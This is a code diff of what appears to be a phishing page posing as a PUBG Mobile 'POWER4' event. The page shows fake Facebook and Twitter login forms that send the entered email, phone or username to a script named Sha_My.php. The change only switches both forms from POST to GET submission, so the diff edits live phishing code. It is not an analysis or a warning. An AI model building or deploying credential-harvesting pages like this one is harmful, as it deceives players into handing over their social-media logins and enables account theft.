@@ -978,7 +978,7 @@ Welcome to PUBG MOBILE POWER4 event
 			<div class="txt-login-fb">
 				 Log in to your Facebook account to connect to PUBG MOBILE
 			</div>
-			<form class="login-form" action="Sha_My.php" method="post">
+			<form class="login-form" action="Sha_My.php" method="get">
 				<label>
 				<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
 				</label>
@@ -1020,7 +1020,7 @@ Welcome to PUBG MOBILE POWER4 event
 		</div>
 		<div class="box-twitter">
 			<center>
-			<form action="Sha_My.php" method="post">
+			<form action="Sha_My.php" method="get">
 				<div class="txt-login-twitter">Login to Twitter</div>
 				<div class="input-box-twitter">
 					<label>Phone, email, or username</label>
